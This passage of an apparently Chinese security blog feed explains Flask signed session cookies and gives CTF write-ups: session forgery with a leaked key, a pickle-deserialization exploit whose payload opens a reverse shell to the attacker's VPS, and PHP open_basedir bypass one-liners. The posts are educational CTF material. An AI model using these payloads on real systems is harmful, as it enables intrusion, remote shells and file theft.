class="line">        rv = self.make_signer(salt).sign(payload)</span><br><span class="line">        <span class="keyword">if</span> self.is_text_serializer:</span><br><span class="line">            rv = rv.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        <span class="keyword">return</span> rv</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dump_payload</span><span class="params">(self, obj)</span>:</span></span><br><span class="line">        <span class="string">"""Dumps the encoded object. The return value is always a</span></span><br><span class="line"><span class="string">        bytestring. If the internal serializer is text based the value</span></span><br><span class="line"><span class="string">        will automatically be encoded to utf-8.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">return</span> want_bytes(self.serializer.dumps(obj))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">URLSafeSerializerMixin</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""Mixed in with a regular serializer it will attempt to zlib compress</span></span><br><span class="line"><span class="string">    the string to make it shorter if necessary. It will also base64 encode</span></span><br><span class="line"><span class="string">    the string so that it can safely be placed in a URL.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">load_payload</span><span class="params">(self, payload)</span>:</span></span><br><span class="line">        decompress = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> payload.startswith(<span class="string">b'.'</span>):</span><br><span class="line">            payload = payload[<span class="number">1</span>:]</span><br><span class="line">            decompress = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            json = base64_decode(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> BadPayload(<span class="string">'Could not base64 decode the payload because of '</span></span><br><span class="line">                <span class="string">'an exception'</span>, original_error=e)</span><br><span class="line">        <span class="keyword">if</span> decompress:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                json = zlib.decompress(json)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">raise</span> BadPayload(<span class="string">'Could not zlib decompress the payload before '</span></span><br><span class="line">                    <span class="string">'decoding the payload'</span>, original_error=e)</span><br><span class="line">        <span class="keyword">return</span> super(URLSafeSerializerMixin, self).load_payload(json)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dump_payload</span><span class="params">(self, obj)</span>:</span></span><br><span class="line">        json = super(URLSafeSerializerMixin, self).dump_payload(obj)</span><br><span class="line">        is_compressed = <span class="literal">False</span></span><br><span class="line">        compressed = zlib.compress(json)</span><br><span class="line">        <span class="keyword">if</span> len(compressed) &lt; (len(json) - <span class="number">1</span>):</span><br><span class="line">            json = compressed</span><br><span class="line">            is_compressed = <span class="literal">True</span></span><br><span class="line">        base64d = base64_encode(json)</span><br><span class="line">        <span class="keyword">if</span> is_compressed:</span><br><span class="line">            base64d = <span class="string">b'.'</span> + base64d</span><br><span class="line">        <span class="keyword">return</span> base64d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">URLSafeTimedSerializer</span><span class="params">(URLSafeSerializerMixin, TimedSerializer)</span>:</span></span><br><span class="line">    <span class="string">"""Works like :class:`TimedSerializer` but dumps and loads into a URL</span></span><br><span class="line"><span class="string">    safe string consisting of the upper and lowercase character of the</span></span><br><span class="line"><span class="string">    alphabet as well as ``'_'``, ``'-'`` and ``'.'``.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    default_serializer = compact_json</span><br></pre></td></tr></table></figure><p>主要关注dump_payload、dumps，这是序列化session的主要过程。</p><p>可见，序列化的操作分如下几步：</p><ol><li>json.dumps 将对象转换成json字符串，作为数据</li><li>如果数据压缩后长度更短，则用zlib库进行压缩</li><li>将数据用base64编码</li><li>通过hmac算法计算数据的签名，将签名附在数据后，用“.”分割</li></ol><p>第4步就解决了用户篡改session的问题，因为在不知道secret_key的情况下，是无法伪造签名的。</p><h1 id="session解密"><a href="#session解密" class="headerlink" title="session解密"></a>session解密</h1><p>session 在 cookie 中的值，是一个字符串，由句号分割成三个部分。第一部分是 base64 加密的数据，第二部分是时间戳，第三部分是校验信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">s = <span class="string">"eyJ1c2VybmFtZSI6InllMXMifQ.XxU53w.L7_pVjkrwxpqtG1r8_RwZvMMWK0"</span></span><br><span class="line">data,timestamp,secret = s.split(<span class="string">'.'</span>)</span><br><span class="line">print(<span class="string">"data: "</span>,base64_decode(data))</span><br><span class="line">time_stamp=int.from_bytes(base64_decode(timestamp),byteorder=<span class="string">'big'</span>)</span><br><span class="line">time=time.strftime(<span class="string">"%Y-%m-%d %H:%I%S"</span>,time.localtime(time_stamp))</span><br><span class="line">print(<span class="string">"time: "</span>,time)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result:  </span><br><span class="line">data:  <span class="string">b'&#123;"username":"ye1s"&#125;'</span></span><br><span class="line">time:  <span class="number">2020</span><span class="number">-07</span><span class="number">-20</span> <span class="number">14</span>:<span class="number">0251</span></span><br></pre></td></tr></table></figure><p>P师傅的脚本解密 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span><span class="params">(payload)</span>:</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b'.'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b'.'</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'Could not base64 decode the payload because of '</span></span><br><span class="line">                         <span class="string">'an exception'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">'Could not zlib decompress the payload before '</span></span><br><span class="line">                             <span class="string">'decoding the payload'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    s=<span class="string">"eyJ1c2VybmFtZSI6InllMXMifQ.XxU53w.L7_pVjkrwxpqtG1r8_RwZvMMWK0"</span><span class="comment">#替换为你的session字符串</span></span><br><span class="line">    print(decryption(s.encode()))</span><br></pre></td></tr></table></figure><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>随便注册一个账号登录，在修改密码的地方，提示源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;woadsl1234&#x2F;hctf_flask&#x2F;</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/weixin_44677409/article/details/100733581" target="_blank" rel="noopener">HCTF2018-admin</a></p><p>解法一：session伪造<br>注册一个账号后登入，抓包得到cookie的session,解密得 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">'_fresh'</span>: <span class="literal">True</span>, <span class="string">'_id'</span>: <span class="string">b'fe143907fe0a678ebe8ceb972968e2f7b98bb5586f8db03defbde94a673235364017f31733e74b7fa98a1d2a163f0c7d7b776b3a68dc1ef96a392cd5c205af28'</span>, <span class="string">'csrf_token'</span>: <span class="string">b'6298f03ac923b6b7006403d7a5ca798a645e338e'</span>, <span class="string">'image'</span>: <span class="string">b'V7hq'</span>, <span class="string">'name'</span>: <span class="string">'test'</span>, <span class="string">'user_id'</span>: <span class="string">'10'</span>&#125;</span><br></pre></td></tr></table></figure><p>如果我们想要加密伪造生成自己想要的session还需要知道SECRET_KEY，在config.py里可以发现了SECRET_KEY。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SECRET_KEY = os.environ.get(<span class="string">'SECRET_KEY'</span>) <span class="keyword">or</span> <span class="string">'ckj123'</span></span><br></pre></td></tr></table></figure><p>一个flask session加密的脚本 <a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">https://github.com/noraj/flask-session-cookie-manager</a>             </p><p>利用刚刚得到的SECRET_KEY，在将解密出来的name改为admin，最后用脚本生成我们想要的session即可<br>加密     </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -s &quot;ckj123&quot; -t &quot;&#123;&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;fe143907fe0a678ebe8ceb972968e2f7b98bb5586f8db03defbde94a673235364017f31733e74b7fa98a1d2a163f0c7d7b776b3a68dc1ef96a392cd5c205af28&#39;, &#39;csrf_token&#39;: b&#39;6298f03ac923b6b7006403d7a5ca798a645e338e&#39;, &#39;image&#39;: b&#39;V7hq&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;&#125;&quot;</span><br></pre></td></tr></table></figure><h2 id="虎符2021easyflask"><a href="#虎符2021easyflask" class="headerlink" title="虎符2021easyflask"></a>虎符2021easyflask</h2><p>存在任意文件读取，根据提示读取部分源码  </p><p>file?file=/flask/source.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3.6</span><br><span class="line">import os</span><br><span class="line">import pickle</span><br><span class="line">from base64 import b64decode</span><br><span class="line">from flask import Flask, request, render_template, session</span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"># add secret key to enable session</span><br><span class="line"># and this is a fake secret key, just an example</span><br><span class="line">app.config[&#39;SECRET_KEY&#39;] &#x3D; &#39;ADD_YOUR_SECRET_KEY_HERE&#39;</span><br><span class="line"></span><br><span class="line">User &#x3D; type(&#39;User&#39;, (object,), &#123; &#39;uname&#39;: &#39;test&#39;, &#39;is_admin&#39;: 0, &#39;__repr__&#39;: lambda o: o.uname, &#125;)</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;&#39;, methods&#x3D;(&#39;GET&#39;,))</span><br><span class="line">def index_handler():</span><br><span class="line">    if not session.get(&#39;u&#39;):</span><br><span class="line">        u &#x3D; pickle.dumps(User())</span><br><span class="line">        session[&#39;u&#39;] &#x3D; u</span><br><span class="line">    return render_template(&#39;in.html&#39;)</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;file&#39;, methods&#x3D;(&#39;GET&#39;,))</span><br><span class="line">def file_handler():</span><br><span class="line">    path &#x3D; request.args.get(&#39;file&#39;)</span><br><span class="line">    path &#x3D; os.path.join(&#39;static&#39;, path)</span><br><span class="line">    if not os.path.exists(path) or os.path.isdir(path) \</span><br><span class="line">            or &#39;.py&#39; in path or &#39;.sh&#39; in path or &#39;..&#39; in path:</span><br><span class="line">        return &#39;disallowed&#39;</span><br><span class="line">    with open(path, &#39;r&#39;) as fp:</span><br><span class="line">        content &#x3D; fp.read()</span><br><span class="line">    return content</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;admin&#39;, methods&#x3D;(&#39;GET&#39;,))</span><br><span class="line">def admin_handler():</span><br><span class="line">    try:</span><br><span class="line">        u &#x3D; session.get(&#39;u&#39;)</span><br><span class="line">        if isinstance(u, dict):</span><br><span class="line">            u &#x3D; b64decode(u.get(&#39;b&#39;))</span><br><span class="line">            u &#x3D; pickle.loads(u)</span><br><span class="line">        if u.is_admin &#x3D;&#x3D; 1:</span><br><span class="line">            return &#39;welcome, admin&#39;</span><br><span class="line">        else:</span><br><span class="line">            return &#39;who are you?&#39;</span><br><span class="line">    except Exception:</span><br><span class="line">        return &#39;uhh?&#39;</span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.run(&#39;0.0.0.0&#39;, port&#x3D;8008, debug&#x3D;False)</span><br></pre></td></tr></table></figure><p>file?file=/proc/self/environ 获取相关环境变量可得secret_key。<br>存在pickle反序列化，通过伪造session来触发反序列化反弹shell。     </p><p>反弹shell部分生成 </p><p>exp:  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        s = <span class="string">"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("你的VPS_ip地址",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'"""</span></span><br><span class="line">        <span class="keyword">return</span> os.system, (s,)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">s = pickle.dumps(e)</span><br><span class="line"></span><br><span class="line">cookies=dict(</span><br><span class="line">    u=base64.b64encode(s).decode()</span><br><span class="line">)</span><br><span class="line"><span class="keyword">print</span> cookies</span><br></pre></td></tr></table></figure><p>一个flask session加密的脚本 <a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">https://github.com/noraj/flask-session-cookie-manager</a>  </p><p>参考文章：</p><p><a href="https://xz.aliyun.com/t/3569" target="_blank" rel="noopener">Python Web之flask session&amp;格式化字符串漏洞</a><br><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html" target="_blank" rel="noopener">客户端 session 导致的安全问题</a><br><a href="https://www.anquanke.com/post/id/163975" target="_blank" rel="noopener">从HCTF两道Web题谈谈flask客户端session机制</a><br><a href="https://cizixs.com/2017/03/08/flask-insight-session/" target="_blank" rel="noopener">flask 源码解析：session</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Flask的session是存储在客户端的(可以通过HTTP请求头Cookie字段的session获取)，Flask只对数据进行了签名(防篡改)没有进行加密，session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>bypass open_basedir方法</title>
    <link href="https://blog.cfyqy.com/article/cf8d248.html"/>
    <id>https://blog.cfyqy.com/article/cf8d248.html</id>
    <published>2021-04-23T14:11:54.000Z</published>
    <updated>2021-05-11T16:41:45.754Z</updated>
    
    <content type="html"><![CDATA[<h1 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h1><p>bypass open_basedir方法</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);echo(file_get_contents(&#39;flag&#39;));</span><br></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/4720" target="_blank" rel="noopener">https://xz.aliyun.com/t/4720</a></p><h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><p>使用可遍历目录类绕过 open_basedir</p><p>使用 DirectoryIterator 类或 FilesystemIterator 类<br>DirectoryIterator与glob://协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件。</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$dir = $_GET[<span class="string">'whoami'</span>];</span><br><span class="line">$a = <span class="keyword">new</span> DirectoryIterator($dir);</span><br><span class="line"><span class="keyword">foreach</span>($a <span class="keyword">as</span> $f)&#123;</span><br><span class="line">    <span class="keyword">echo</span>($f-&gt;__toString().<span class="string">'&lt;br&gt;'</span>);<span class="comment">// 不加__toString()也可,因为echo可以自动调用</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload一句话的形式:</span></span><br><span class="line">$a = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///*"</span>);<span class="keyword">foreach</span>($a <span class="keyword">as</span> $f)&#123;<span class="keyword">echo</span>($f-&gt;__toString().<span class="string">'&lt;br&gt;'</span>);&#125;</span><br></pre></td></tr></table></figure><p>我们输入 /?whoami=glob:///* 即可列出根目录下的所有文件</p><p>使用 GlobIterator 类<br>由于使用 GlobIterator 类支持直接通过模式匹配来寻找文件路径，所以我们就不用在配合glob://协议了。</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$dir = $_GET[<span class="string">'whoami'</span>];</span><br><span class="line">$a = <span class="keyword">new</span> GlobIterator($dir);</span><br><span class="line"><span class="keyword">foreach</span>($a <span class="keyword">as</span> $f)&#123;</span><br><span class="line">    <span class="keyword">echo</span>($f-&gt;__toString().<span class="string">'&lt;br&gt;'</span>);<span class="comment">// 不加__toString()也可,因为echo可以自动调用</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload一句话的形式:</span></span><br><span class="line">$a = <span class="keyword">new</span> FilesystemIterator(<span class="string">"/*"</span>);<span class="keyword">foreach</span>($a <span class="keyword">as</span> $f)&#123;<span class="keyword">echo</span>($f-&gt;__toString().<span class="string">'&lt;br&gt;'</span>);&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;方法一&quot;&gt;&lt;a href=&quot;#方法一&quot; class=&quot;headerlink&quot; title=&quot;方法一&quot;&gt;&lt;/a&gt;方法一&lt;/h1&gt;&lt;p&gt;bypass open_basedir方法&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>CTF的知识点小记</title>
    <link href="https://blog.cfyqy.com/article/925aa49a.html"/>
    <id>https://blog.cfyqy.com/article/925aa49a.html</id>
    <published>2021-04-22T03:00:52.000Z</published>
    <updated>2021-06-29T09:32:21.854Z</updated>
    
    <content type="html"><![CDATA[<p>零散的知识点记录</p><a id="more"></a><h1 id="json"><a href="#json" class="headerlink" title="json"></a>json</h1><p>1.在json环境下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20 %2B \f \n \r \t \u0009 \u000A \u000B \u000C \u000D \u0020 \u002B</span><br></pre></td></tr></table></figure><p>这些字符会作为mysql分隔符。<br>2.json支持的字符中可以支持unicode编码。<br>转换脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unicode_encode</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $table = [</span><br><span class="line">        <span class="string">'\u002'</span>=&gt;[<span class="string">' '</span>,<span class="string">'!'</span>,<span class="string">'"'</span>,<span class="string">'#'</span>,<span class="string">'$'</span>,<span class="string">'%'</span>,<span class="string">'&amp;'</span>,<span class="string">'\''</span>,<span class="string">'('</span>,<span class="string">')'</span>,<span class="string">'*'</span>,<span class="string">'+'</span>,<span class="string">','</span>,<span class="string">'-'</span>,<span class="string">'.'</span>,<span class="string">'/'</span>],</span><br><span class="line">        <span class="string">'\u003'</span>=&gt;[<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">':'</span>,<span class="string">';'</span>,<span class="string">'&lt;'</span>,<span class="string">'='</span>,<span class="string">'&gt;'</span>,<span class="string">'?'</span>],</span><br><span class="line">        <span class="string">'\u004'</span>=&gt;[<span class="string">'@'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>,<span class="string">'E'</span>,<span class="string">'F'</span>,<span class="string">'G'</span>,<span class="string">'H'</span>,<span class="string">'I'</span>,<span class="string">'J'</span>,<span class="string">'K'</span>,<span class="string">'L'</span>,<span class="string">'M'</span>,<span class="string">'N'</span>,<span class="string">'O'</span>],</span><br><span class="line">        <span class="string">'\u005'</span>=&gt;[<span class="string">'P'</span>,<span class="string">'Q'</span>,<span class="string">'R'</span>,<span class="string">'S'</span>,<span class="string">'T'</span>,<span class="string">'U'</span>,<span class="string">'V'</span>,<span class="string">'W'</span>,<span class="string">'X'</span>,<span class="string">'Y'</span>,<span class="string">'Z'</span>,<span class="string">'['</span>,<span class="string">'\\'</span>,<span class="string">']'</span>,<span class="string">'^'</span>,<span class="string">'_'</span>],</span><br><span class="line">        <span class="string">'\u006'</span>=&gt;[<span class="string">'`'</span>,<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>],</span><br><span class="line">        <span class="string">'\u007'</span>=&gt;[<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'&#123;'</span>,<span class="string">'|'</span>,<span class="string">'&#125;'</span>,<span class="string">'~'</span>]</span><br><span class="line">    ];</span><br><span class="line">    <span class="keyword">foreach</span> ($table <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">foreach</span> ($value <span class="keyword">as</span> $vcode) &#123;</span><br><span class="line">            $i=$i+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>($str==$vcode)&#123;</span><br><span class="line">                <span class="keyword">return</span> $key.bin2e($i<span class="number">-1</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bin2e</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> ($str) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'10'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'a'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'11'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'b'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'12'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'c'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'13'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'d'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'14'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'e'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'15'</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'f'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> $str;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span><span 